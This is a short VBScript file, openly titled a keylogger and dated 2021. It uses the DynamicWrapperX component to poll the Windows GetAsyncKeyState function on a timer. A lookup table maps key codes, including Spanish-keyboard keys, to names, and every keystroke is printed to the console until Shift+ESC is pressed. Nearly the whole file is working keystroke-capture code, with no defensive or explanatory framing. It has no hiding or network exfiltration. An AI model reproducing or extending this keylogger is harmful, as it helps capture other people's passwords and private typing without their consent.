'****************************************************
'* KeyloggerVBS using DynamicWrapperX
'* https://www.script-coding.com/dynwrapx_eng.html
'* AGV 2021
'****************************************************
Option Explicit


Dim  uIDEvent,pAddr, bLoop, i, oWrap
Dim d:Set d = CreateObject ("Scripting.Dictionary")
d.add 1,"{mouse-L}"
d.add 2,"{mouse-R}"
d.add 3,"{CANCEL}"
d.add 4,"{mouse-M}"
d.add 5,"{Num5-noNLck}"
d.add 8,"{BACKSPACE}"
d.add 9,"{TAB}"
d.add &h0d,"{RETURN}"
d.add &h10,"{SHIFT}"
d.add &h11,"{CTRL}"
d.add &h13,"{PAUSE}"
d.add &h90,"{NUMLOCK}"
d.add &H91,"{SCROLLLOCK}"
d.add &h14,"{CAPSLOCK}"
d.add 27,"{ESC}"
d.add &h20,"{SPACE}"
d.add &h21,"{PGUP}"
d.add &h22,"{PGDN}"
d.add &h23,"{END}"
d.add &h24,"{HOME}"
d.add &h25,"{LEFT}"
d.add &h26,"{UP}"
d.add &h27,"{RIGHT}"
d.add &h28,"{DOWN}"
d.add &h2a,"{PRTSC}"
d.add &h2b,"{INS}"
d.add &h2e,"{DEL}"
d.add &h2f,"{HELP}"


d.add 160 ,"{LShift}"
d.add 161 , "{RShift}"
d.add 162 , "{LCtrl}"
d.add 163 , "{RCtrl}"
d.add 91 ,"{LWin}"
d.add 92 ,"{RWin}"
d.add 93 ,"{Menu}"
d.add 164 , "{Alt}"
d.add 165 , "{AltGr}"

for i=48 to 57   ' numeros
   d.add i,"{"& right("00"& chr(i),2)&"}"
next
 
for i=65 to 90   'letras
   d.add i ,"{"& chr(i)&"}"
next

for i=&h60 to &h69  'tecl numerico
    d.add i,"{N"& right("00"& i-&h60+1,2)&"}"
next

d.add &h6a,"{N*}"
d.add &h6b,"{N+}"
d.add &h6c,"{N-enter}"
d.add &h6d,"{N-}"
d.add &h6e,"{N-dot}"
d.add &h6f,"{N/}"

for i=&h70 to &h7f   'funcion
   d.add i,"{F"& right("00"&(i- &h70+1),2)&"}"
next

'solo teclado español
d.add 226 ,"{<}"
d.add 220 ,"{\}"
d.add 221 ,"{¿}"
d.add 219 ,"{?}"
d.add 191 ,"{ç}"
d.add 222 ,"{Ñ}"
d.add 186 ,"{[}"
d.add 187 ,"{]}"
d.add 189 ,"{_}"
d.add 190 ,"{.}"
d.add 188 ,"{,}"


'MAIN


wscript.echo "VBS KEYLOGGER   Shift + ESC to quit"
set oWrap= CreateObject("DynamicWrapperX")
With oWrap
  .Register "user32.dll", "SetTimer", "i=llll", "r=l"
  .Register "user32.dll", "KillTimer", "i=ll", "r=l"
  .Register "user32.dll", "GetAsyncKeyState", "i=l", "r=n"

pAddr = .RegisterCallback(GetRef("TimerProc"), "i=llll", "r=l")
uIDEvent = .SetTimer(0, 0, 50, pAddr)
bLoop=True
While bLoop
  WScript.Sleep 80
Wend
.KillTimer 0,uIDEvent
End With

Sub TimerProc(hWnd, uMsg, idEvent, dwTime)  'timer callback
  Dim i
  Dim cKey
  cKey = ""

  if  CBool(oWrap.GetAsyncKeyState(160)) and  CBool(oWrap.GetAsyncKeyState(27)) then bloop=false
  'chequeamos todas las teclas
  For i = 0 to 255
  if  CBool(oWrap.GetAsyncKeyState(i)) then
     if d.Exists(i) then  ckey=ckey & d(i) else ckey=ckey & "'"&i&"'"
  end if   
  Next
  If cKey <> "" Then wscript.stdout.writeline ckey 
End Sub



